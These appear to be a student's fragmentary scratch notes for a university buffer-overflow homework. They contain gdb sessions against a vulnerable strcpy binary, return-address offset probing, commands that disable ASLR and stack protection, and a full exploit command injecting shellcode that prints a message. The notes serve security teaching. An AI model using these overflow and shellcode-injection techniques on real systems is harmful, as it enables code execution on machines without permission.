@@ -1,0 +1,212 @@
+As in all matters of this class (and in general!), you are responsible and <i>will be held accountable</i> for making absolutely sure that all information is gleaned in complete accordance with all laws and BU policies.  If you have any doubts about an approach, you are urged to first talk to the instructor.", "<b>NOTE:</b>  As in all matters of this class (and in general!), you have the right to remain silent (and get an F).  Any code you write may be used against you.  You have the right to consult an engineer (i.e. yourself) before compiling your code, if you wish.", "<b>NOTE:</b>  As in all matters of this class (and in general!), if you cannot afford an engineer, stay away from the code.  If you decide to code anyway, you still have the right to admit defeat and run away.  Knowing your rights, are you willing to continue doing this homework?"];
+   
+
+["", "You know, a jump short would be much better than a call in the assembly below.","1b is really hard ... don't waste too much time on it."];
+
+https://www.youtube.com/watch?v=fabjtr1Zwnc
+
+https://www.exploit-db.com/docs/33698.pdf
+
+https://www.youtube.com/watch?v=zMl6sK_ThHM
+
+-----
+
+http://reverseengineering.stackexchange.com/questions/8504/problem-finding-return-address-for-shellcode
+
+https://www.exploit-db.com/docs/28475.pdf
+
+https://leaksource.files.wordpress.com/2014/08/hacking-the-art-of-exploitation.pdf
+
+----
+Lecture: gdb
+disassemble /rm main
+echo "set disassembly-flavor intel" > ~/.gdbinit
+----
+
+disas main
+Dump of assembler code for function main:
+   0x00000000004007e6 <+0>:	push   %rbp
+   0x00000000004007e7 <+1>:	mov    %rsp,%rbp
+   0x00000000004007ea <+4>:	sub    $0x20,%rsp
+   0x00000000004007ee <+8>:	mov    %edi,-0x14(%rbp)
+   0x00000000004007f1 <+11>:	mov    %rsi,-0x20(%rbp)
+   0x00000000004007f5 <+15>:	mov    -0x20(%rbp),%rax
+   0x00000000004007f9 <+19>:	add    $0x8,%rax
+   0x00000000004007fd <+23>:	mov    (%rax),%rdx
+   0x0000000000400800 <+26>:	lea    -0x10(%rbp),%rax
+   0x0000000000400804 <+30>:	mov    %rdx,%rsi
+   0x0000000000400807 <+33>:	mov    %rax,%rdi
+   0x000000000040080a <+36>:	callq  0x4006c0 <strcpy@plt>
+   0x000000000040080f <+41>:	lea    -0x10(%rbp),%rax
+   0x0000000000400813 <+45>:	mov    %rax,%rsi
+   0x0000000000400816 <+48>:	mov    $0x601060,%edi
+   0x000000000040081b <+53>:	callq  0x4006b0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x0000000000400820 <+58>:	mov    $0x4006e0,%esi
+   0x0000000000400825 <+63>:	mov    %rax,%rdi
+   0x0000000000400828 <+66>:	callq  0x4006d0 <_ZNSolsEPFRSoS_E@plt>
+   0x000000000040082d <+71>:	mov    $0x0,%eax
+   0x0000000000400832 <+76>:	leaveq 
+---Type <return> to continue, or q <return> to quit---
+   0x0000000000400833 <+77>:	retq   
+End of assembler dump.
+
+ i f
+Stack level 0, frame at 0x7fffffffe290:
+ rip = 0x4007ea in main; saved rip = 0x7ffff71c02b1
+ Arglist at 0x7fffffffe280, args: 
+ Locals at 0x7fffffffe280, Previous frame's sp is 0x7fffffffe290
+ Saved registers:
+  rbp at 0x7fffffffe280, rip at 0x7fffffffe288
+
+
+
+p &buffer
+$1 = (char (*)[30]) 0x7ffff753d2c0 <buffer>
+
+(gdb) r $(python -c 'print "a"*25+"\x12\x33\x69\x15"')
+Starting program: /root/Desktop/HW_5/hw5_1a $(python -c 'print "a"*25+"\x12\x33\x69\x15"')
+aaaaaaaaaaaaaaaaaaaaaaaaa3i
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000001569331261 in ?? ()
+(gdb) i f
+Stack level 0, frame at 0x7fffffffe298:
+ rip = 0x1569331261; saved rip = 0x11c00
+ called by frame at 0x7fffffffe2a0
+ Arglist at 0x7fffffffe288, args: 
+ Locals at 0x7fffffffe288, Previous frame's sp is 0x7fffffffe298
+ Saved registers:
+  rip at 0x7fffffffe290
+(gdb) r $(python -c 'print "a"*24+"\x12\x33\x69\x15"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/Desktop/HW_5/hw5_1a $(python -c 'print "a"*24+"\x12\x33\x69\x15"')
+aaaaaaaaaaaaaaaaaaaaaaaa3i
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007f0015693312 in ?? ()
+(gdb) i f
+Stack level 0, frame at 0x7fffffffe298:
+ rip = 0x7f0015693312; saved rip = 0x11c00
+ called by frame at 0x7fffffffe2a0
+ Arglist at 0x7fffffffe288, args: 
+ Locals at 0x7fffffffe288, Previous frame's sp is 0x7fffffffe298
+ Saved registers:
+  rip at 0x7fffffffe290
+
+\xEB\x36\x48\x31\xF6\x48\x83\xC6\x0C\x59\x48\x89\xCF\x48\x89\xF9\x48\x31\xC0\x48\x83\xC0\x04\x48\x31\xDB\x48\x83\xC3\x02\x48\x31\xD2\x48\x83\xC2\x15\xCD\x80\x48\xFF\xCE\x75\xE1\x48\x31\xC0\x48\x83\xC0\x01\x48\x31\xDB\xCD\x80\xE8\xC5\xFF\xFF\xFF\x53\x61\x79\x61\x5F\x68\x61\x63\x6B\x5F\x6F\x6C\x65\x68\x5F\x69\x74\x75\x5F\x73\x61\x79\x61\x0A\x0D
+
+EB 36 48 31 F6 48 83 C6 0C 59 48 89 CF 48 89 F9 48 31 C0 48 83 C0 04 48 31 DB 48 83 C3 02 48 31 D2 48 83 C2 15 CD 80 48 FF CE 75 E1 48 31 C0 48 83 C0 01 48 31 DB CD 80 E8 C5 FF FF FF 53 61 79 61 5F 68 61 63
+
+\x0D\x0A\x61\x79\x61\x73\x\5F\x75\x74\x69\x5F\x68\x65\x6C\x6F\x5F\x6B\x63
+
+r $(python -c 'print "a"*25+"\xEB\x36\x48\x31\xF6\x48\x83\xC6\x0C\x59\x48\x89\xCF\x48\x89\xF9\x48\x31\xC0\x48\x83\xC0\x04\x48\x31\xDB\x48\x83\xC3\x02\x48\x31\xD2\x48\x83\xC2\x15\xCD\x80\x48\xFF\xCE\x75\xE1\x48\x31\xC0\x48\x83\xC0\x01\x48\x31\xDB\xCD\x80\xE8\xC5\xFF\xFF\xFF\x53\x61\x79\x61\x5F\x68\x61\x63\x6B\x5F\x6F\x6C\x65\x68\x5F\x69\x74\x75\x5F\x73\x61\x79\x61\x0A\x0D"')
+
+p &buffer
+$2 = (char (*)[30]) 0x7f ff f7 53 d2 c0 <buffer>
+
+/50x $rsp
+0x7fffffffe260:	0x00007fffffffe368	0x00000002004006f0
+0x7f ff ff ff e2 70:	0x6161616161616161	0x6161616161616161
+0x7fffffffe280:	0x6161616161616161	0x0000 36 eb 7f0015693312
+0x7fffffffe290:	0x0000000000011c00	0x00007fffffffe368
+0x7fffffffe2a0:	0x00000002ffffe380	0x00000000004007e6
+
+\xEB\x36\x48\x31\xF6\x48\x83\xC6\x0C\x59\x48\x89\xCF\x48\x89\xF9\x48\x31\xC0\x48\x83\xC0\x04\x48\x31\xDB\x48\x83\xC3\x02\x48\x31\xD2\x48\x83\xC2\x15\xCD\x80\x48\xFF\xCE\x75\xE1\x48\x31\xC0\x48\x83\xC0\x01\x48\x31\xDB\xCD\x80\xE8\xC5\xFF\xFF\xFF\x53\x61\x79\x61\x5F\x68\x61\x63\x6B\x5F\x6F\x6C\x65\x68\x5F\x69\x74\x75\x5F\x73\x61\x79\x61\x0A\x0D
+
+\xeb\x36\x48\x31\xf6\x48\x83\xc6\x0c\x59\x48\x89\xcf\x48\x89\xf9\x48\x31\xc0\x48\x83\xc0\x04\x48\x31\xdb\x48\x83\xc3\x02\x48\x31\xd2\x48\x83\xc2\x15\xcd\x80\x48\xff\xce\x75\xe1\x48\x31\xc0\x48\x83\xc0\x01\x48\x31\xdb\xcd\x80\xe8\xc5\xff\xff\xff\x53\x61\x79\x61\x5f\x68\x61\x63\x6b\x5f\x6f\x6c\x65\x68\x5f\x69\x74\x75\x5f\x73\x61\x79\x61\x0a\x0d 
+
+(gdb) r $(python -c 'print "a"*24+"\x90\xe2\xff\xff\xff\x7f"+"\xeb\x36\x48\x31\xf6\x48\x83\xc6\x0c\x59\x48\x89\xcf\x48\x89\xf9\x48\x31\xc0\x48\x83\xc0\x04\x48\x31\xdb\x48\x83\xc3\x02\x48\x31\xd2\x48\x83\xc2\x15\xcd\x80\x48\xff\xce\x75\xe1\x48\x31\xc0\x48\x83\xc0\x01\x48\x31\xdb\xcd\x80\xe8\xc5\xff\xff\xff\x53\x61\x79\x61\x5f\x68\x61\x63\x6b\x5f\x6f\x6c\x65\x68\x5f\x69\x74\x75\x5f\x73\x61\x79\x61\x0a\x0d"')
+
+export SHELLCODE=$(cat hack2.o) 
+root@kali:~/Desktop/HW_5# ./getenvaddr SHELLCODE ./hw5_1a
+SHELLCODE will be at 0x7fffffffec67
+
+
+====================
+
+"0x15 69 33 12"
+
+0x4007ea
+
+(gdb) r $'\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x12\x33\x69\x15'
+
+(gdb) r $'\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x12\x33\x69\x15'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/Desktop/HW_5/hw5_1a $'\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x12\x33\x69\x15'
+aaaaaaaaaaaaaaaaaaaaaaaaaa3i
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000156933126161 in ?? ()
+
+------
+(gdb) print &buffer
+$3 = (char (*)[30]) 0x7ffff753d2c0 <buffer>
+(gdb) i f
+Stack level 0, frame at 0x7fffffffe230:
+ rip = 0x4007ea in main; saved rip = 0x7ffff71c02b1
+ Arglist at 0x7fffffffe220, args: 
+ Locals at 0x7fffffffe220, Previous frame's sp is 0x7fffffffe230
+ Saved registers:
+  rbp at 0x7fffffffe220, rip at 0x7fffffffe228
+
+
+
+
+(gdb) r $(python -c 'print "a"*27')
+x/100/x $rsp
+
+-----
+
+DEC OCT HEX BIN  Symbol   HTML Number Description
+32  040 20  00100000      &#32;  Space
+95  137 5F  01011111  _     &#95;  Underscore
+
+-------
+
+
+ndisasm -b 64 hack.o
+00000000  7F45              jg 0x47
+
+
+
+========================
+
+\xeb\x36\x48\x31\xf6\x48\x83\xc6\x0c\x59\x48\x89\xcf\x48\x89\xf9\x48\x31\xc0\x48\x83\xc0\x04\x48\x31\xdb\x48\x83\xc3\x02\x48\x31\xd2\x48\x83\xc2\x15\xcd\x80\x48\xff\xce\x75\xe1\x48\x31\xc0\x48\x83\xc0\x01\x48\x31\xdb\xcd\x80\xe8\xc5\xff\xff\xff\x53\x61\x79\x61\x5f\x68\x61\x63\x6b\x5f\x6f\x6c\x65\x68\x5f\x69\x74\x75\x5f\x73\x61\x79\x61\x0a\x0d
+
+
+$ nasm -felf64 shelltest.s -o shelltest.o
+$ ld -s -o hello hello.o
+$ for i in $(objdump -d hello |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
+
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+$ g++ -m64 -fno-stack-protector -z execstack -o code code.c    
+$./code
+Hello, world!
+
+----
+
+0x400870 <main+58>      call   0x400710 <strcpy@plt>
+0x400898 <main+98>                                              leave
+
+ gdb -tui bof
+set disable-randomization on
+(gdb) set disassembly-flavor intel
+(gdb) layout asm
+(gdb) layout regs
+(gdb) break main
+(gdb) run $(python -c 'print "A" * 24 + "B" * 6')
+
+p &argv[2]
+$23 = (char **) 0x7fffffffe2a8
+
+(gdb) p argv[2]
+$24 = 0x7fffffffe5ba "\353\066H1\366H\203\306\fYH\211\317H\211\371H1\
+300H\203\300\004H1\333H\203\303\002H1\322H\203\302\025̀H\377\316u\34
+1H1\300H\203\300\001H1\333̀\350\305\377\377\377Saya_hack_oleh_itu_sa
+ya"
+
+
+run $(python -c 'print "A" * 24 + "\x7f\xff\xff\xff\xe5\xba"[::-1] + " " + "\xeb\x36\x48\x31\xf6\x48\x83\xc6\x0c\x59\x48\x89\xcf\x48\x89\xf9\x48\x31\xc0\x48\x83\xc0\x04\x48\x31\xdb\x48\x83\xc3\x02\x48\x31\xd2\x48\x83\xc2\x15\xcd\x80\x48\xff\xce\x75\xe1\x48\x31\xc0\x48\x83\xc0\x01\x48\x31\xdb\xcd\x80\xe8\xc5\xff\xff\xff\x53\x61\x79\x61\x5f\x68\x61\x63\x6b\x5f\x6f\x6c\x65\x68\x5f\x69\x74\x75\x5f\x73\x61\x79\x61\x0a\x0d"')
